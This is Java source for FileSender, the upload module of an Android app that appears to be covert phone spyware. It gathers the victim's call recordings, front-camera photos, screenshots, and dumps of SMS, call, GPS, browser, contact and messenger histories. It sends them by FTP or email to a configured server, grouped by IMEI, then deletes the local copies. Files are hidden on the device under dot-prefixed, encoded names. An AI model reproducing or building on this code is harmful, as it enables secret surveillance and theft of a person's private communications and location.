package com.dwreload;

import java.io.File;
import java.io.FileInputStream;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.InputStream;
import java.util.Date;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPReply;

import com.dwreload.lib.FileUtil;
import com.dwreload.modules.CameraModule;
import com.dwreload.modules.PhotoModule;
import com.dwreload.modules.RecorderModule;
import com.dwreload.modules.ScreenshotModule;
import com.dwreload.modules.mail.SendMail;
import com.dwreload.services.AppService;

import android.annotation.SuppressLint;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiManager.WifiLock;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
//import android.util.Log;


public class FileSender extends Thread {
	private Context mContext;
	private SettingsManager mSettings;
	private FileType mType;
	
	private WakeLock mWakeLock;
	private WifiLock mWifiLock;
	
	private static final long MAX_ATTACHMENT_SIZE = 10 * 1024 * 1024;
	//private static final long MAX_FILE_SIZE = 15 * 1024 * 1024;
	private static final long MIN_FILE_SIZE = 1;

	public FileSender(Context context, FileType type){
		this.mContext = context;
		this.mSettings = new SettingsManager(context);
		this.mType = type;
		
		PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
		mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DW_WAKELOCK");
		WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
		mWifiLock = wifiManager.createWifiLock(WifiManager.WIFI_MODE_FULL, "DW_WIFILOCK");
	}
	
	@Override
	public synchronized void start() {
		if (AppService.sThreadManager != null) {
			AppService.sThreadManager.addTask(this);
		}
		else{
			Thread.currentThread().setName("[FileSender ("+ mType.name() +")]");
			super.start();
		}
	};
	
	@Override
	public void run(){
		if (!networkAvailable()) {
			return;
		}
		
		if (mType == FileType.RECORD && RecorderModule.isRecording) {
			return;
		}
		
		try {
			acquireWakeLock();
			
			File[] files = getFiles();
			if (files == null || files.length == 0) {
				return;
			}
			
			switch (mType) 
				{
			case PHOTO:
			case RECORD:
			case TEXT:
				break;
			case SCREENSHOT:
			case FRONT_CAMERA_PHOTO:
				if (files.length < 10)
					{
					return;
					}
				break;
			default:
				break;
			}
			
			long currentLength = 0;
			ArrayList<File> fileList = new ArrayList<File>(10);
			long length = 0;
			Boolean FTPSendOK = false;
			Boolean MAILSendOK = false;
			for (int i = 0; i < files.length; i++) {
				length = files[i].length();
				
				if (length < MIN_FILE_SIZE) {
					files[i].delete();
					continue;
				}
				
				if (currentLength >= MAX_ATTACHMENT_SIZE || (fileList.size() > 0 && currentLength + length >= MAX_ATTACHMENT_SIZE) || fileList.size() >= 10) {
					if (mSettings.SendFilesToFTP())
						{
						FTPSendOK = sendFTP(fileList);
						}
					if (mSettings.SendFilesToMail())
						{
						MAILSendOK = SendFilesToMail(fileList);
						}
					if (FTPSendOK || MAILSendOK) 
						{
						deleteFiles(fileList);
						}
					fileList = new ArrayList<File>(10);
					currentLength = 0;
				}
				
				fileList.add(files[i]);
				currentLength += length;
			}
			
			if (fileList.size() > 0) {
				if (mSettings.SendFilesToFTP())
					{
					FTPSendOK = sendFTP(fileList);
					}
				if (mSettings.SendFilesToMail())
					{
					MAILSendOK = SendFilesToMail(fileList);
					}
				if (FTPSendOK || MAILSendOK) 
					{
					deleteFiles(fileList);
					}
				}
			
		}
		catch (Exception e){

		}
		finally{
			releaseWakeLock();
		}
	}
	
	private void acquireWakeLock(){
		try {
			if (mWakeLock != null && !mWakeLock.isHeld()) {
				mWakeLock.acquire();
			}
			if (mWifiLock != null && !mWifiLock.isHeld()) {
				mWifiLock.acquire();
			}
			
		} catch (Exception e) {

		}
	}
	
	private void releaseWakeLock(){
		try {
			if (mWakeLock != null && mWakeLock.isHeld()) {
				mWakeLock.release();
			}
			if (mWifiLock != null && mWifiLock.isHeld()) {
				mWifiLock.release();
			}
			
		} catch (Exception e) {

		}
	}
	

	@SuppressLint("SimpleDateFormat")
	private String getDate(Date date) 
		{
	    return new SimpleDateFormat("yyyy_MM_dd").format(date);
		}
	//======================================================================================================================================================
	private Boolean sendFTP(ArrayList<File> files)
		{
		final String workpath = ("/" + mSettings.ftp_path());
		String phone_id = mSettings.imei();
		FTPClient client = new FTPClient();
		InputStream input;
		Date dt = new Date();
		String date = getDate(dt);

		try {
			client.connect(mSettings.ftp_adress(),mSettings.ftp_port());

			if (!FTPReply.isPositiveCompletion(client.getReplyCode()))
				{
				//если не можем соединиться c сервером, пробуем соединиться еще раз
				client.connect(mSettings.ftp_adress(),mSettings.ftp_port());
				if (!FTPReply.isPositiveCompletion(client.getReplyCode()))
					{
					return false;	
					}
				}
			boolean status = client.login(mSettings.ftp_username(), mSettings.ftp_userpass());
			if (!status)
				{	
				client.logout();
				return false;
				}
			else
				{
				client.enterLocalPassiveMode();
				client.setFileType(FTP.BINARY_FILE_TYPE, FTP.BINARY_FILE_TYPE);
				client.setFileTransferMode(FTP.BINARY_FILE_TYPE);
				client.makeDirectory(workpath + phone_id);
				client.makeDirectory(workpath + phone_id+"/" + date);
				for (File file : files)
					{
					input = new FileInputStream(file);	
					client.storeFile(workpath + phone_id + "/" + date + "/" + (NameChanger(file.getName())), input);
					int rescode = client.getReplyCode();
					if (rescode == FTPReply.CLOSING_DATA_CONNECTION)
						{
						input.close();
						}
					else
						{
						client.logout();
						return false;
						}
					}
				client.logout();
				client.disconnect();
				return true;
				}
			} 
		catch(IOException e)
			{

			}
		catch (Exception e)
			{

			}
		return false;
		}
	//==================================================================================================================================================================================
	private Boolean SendFilesToMail(ArrayList<File> files)
	   	{
	   	ArrayList<File> newfiles = new ArrayList<File>(0);
	   	String theme = "files";
	   	switch (mType)
	   		{
	   		case TEXT:
	   			{
	   			return false;	
	   			}
	   		case RECORD:
	   			theme = "records";
	   			break;
	   		case PHOTO:
	   			theme = "photos";
	   			break;
	   		case SCREENSHOT:
	   			theme = "screenshots";
	   			break;
	   		case FRONT_CAMERA_PHOTO:	
	   			{
	   			theme = "selfshots";
	   			Integer i = 0;	
	   			File dd;
	   			for (File file : files)
	   				{
	   				file.renameTo(NameChanger(file.getAbsolutePath()));
	   				try
	   					{
	   					dd = new File(NameChanger(file.getAbsolutePath()).toString());
	   					
	   					newfiles.add(dd);
	   					}
	   				catch (Exception e)
	   					{
	   					}
	   				i++;
	   				}
	   			}
	   		}
	   	final String subj = "New " + theme + " from " + mSettings.PhoneName();
	   	Boolean res;	
	   	SendMail sm = new SendMail(mContext, newfiles);
		sm.execute(subj, "see attached files");
		try
			{
			res = sm.get(90, TimeUnit.SECONDS);
			} 
		catch (Exception e)
			{
			return false;
			}

		Integer i = 0;
		for (File bfile : newfiles)
			{
			if (!res) bfile.renameTo(files.get(i));
			else bfile.delete();
			}
		return res;
	   	}
	//=====================================================================================================================================================================================
	private void deleteFiles(ArrayList<File> files)
		{
		for (File file : files)
	    	{
	    	file.delete(); 
	    	}	
		}
	//--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	private File[] getFiles(){
		if (!FileUtil.isExternalStorageAvailable()) {
			return null;
		}
		
		File external = mContext.getExternalFilesDir(null);
		
		if (external == null) {
			return null;
		}
		
		return new File(external.getAbsolutePath() + "/").listFiles(filter);
	}
	
	private Boolean networkAvailable(){
		SettingsManager settings = new SettingsManager(mContext);
		ConnectivityManager manager = (ConnectivityManager)mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = manager.getActiveNetworkInfo();
		
		if (info == null){
			return false;
		}
		
		if ((settings.filesOnlyWiFi() || settings.onlyWiFi()) && info.getType() != ConnectivityManager.TYPE_WIFI) {
			return false;
		}
		
		return info.isConnectedOrConnecting();
	}
	
	private FilenameFilter filter = new FilenameFilter() {
		@Override
		public boolean accept(File dir, String filename) {
			switch (mType) {
				case PHOTO:
					return filename.startsWith(PhotoModule.PREFIX);
				case FRONT_CAMERA_PHOTO:
					return filename.startsWith(CameraModule.PREFIX);
				case RECORD:
					//return filename.endsWith(".3gp") || filename.endsWith(".amr");
					return filename.startsWith("." + RecorderModule.CALL_PREFIX) || filename.startsWith("." +  RecorderModule.RECORD_PREFIX);
				case SCREENSHOT:
					return filename.startsWith(ScreenshotModule.PREFIX);
				case TEXT:
					return filename.endsWith("XXW");
			}
			return false;
		}
	};
	
	public enum FileType{
		PHOTO, SCREENSHOT, RECORD, FRONT_CAMERA_PHOTO, TEXT;
	}
	
	private File NameChanger(String name)
		{
		//Log.e("NameChanger takes: ", name);
		String ch = name;
		ch = ch.replaceAll(".&", "(");
		ch = ch.replaceAll("@#", ")");
		ch = ch.replace('%', '.');
		ch = ch.replace('$', '-').replace('A', '0').replace('B', '1').replace('C', '2').replace('D', '3').replace('E', '4').replace('F', '5')
				.replace('G', '6').replace('H', '7').replace('I', '8').replace('J', '9');
		ch = ch.replaceAll("0ndroid", "Android");
		switch (mType)
			{
			case TEXT:
				{
				ch = ch.replaceAll(".VQTROW23S9XXW", "Settings.txt");
				ch = ch.replaceAll(".T45QWTY9LTXXW", "Contact list.txt");
				ch = ch.replaceAll(".LORUUSTRQ5XXW", "Applist.txt");
				ch = ch.replaceAll("SKTXWXUQXXW", "SMS History.txt");
				ch = ch.replaceAll("R2T9TSLSXXW", "Calls History.txt");
				ch = ch.replaceAll("PVT1XULKXXW", "GPS History.txt");
				ch = ch.replaceAll("RZTYL7UMXXW", "Browser History.txt");
				ch = ch.replaceAll(".XLLYR23RT", "Phone is switched_");
				ch = ch.replaceAll("VKLXXW", "on.txt");
				ch = ch.replaceAll("ZWOXXW", "off.txt");
				ch = ch.replaceAll("VBR", "Viber");
				ch = ch.replaceAll("WTP", "Whatsapp");
				ch = ch.replaceAll("KNT", "VKontakte");
				ch = ch.replaceAll("OKR", "Odnoklassniki");
				ch = ch.replaceAll("XRXYQXXW", " History.txt");
				break;
				}
			case RECORD:
				{
				ch = ch.replaceAll(".TRV", "call");
				ch = ch.replaceAll(".SYU", "record");
				ch = ch.replaceAll("RZPXR", ".3gp");
				ch = ch.replaceAll("TMTYV", ".amr");
				ch = ch.replaceAll("QRZWS", ".aac");
				ch = ch.replaceAll("R#R", "from");
				ch = ch.replaceAll("T#T", "to");
				break;
				}
			case PHOTO:
				{
				ch = ch.replaceAll(".WQV", "photo_");
				ch = ch.replaceAll("8M6", "IMG");
				break;
				}
			case FRONT_CAMERA_PHOTO:
				{
				ch = ch.replaceAll(".LKR6Y", "Front_camera");
				ch = ch.replaceAll("UTLS", ".jpg");
				break;
				}
			case SCREENSHOT:
				{
				ch = ch.replaceAll(".ZVV", "screenshot");
				ch = ch.replaceAll("UTLS", ".jpg");
				}
		}
		//Log.e("NameChanger return: ", ch);
		return new File(ch);
	}
}
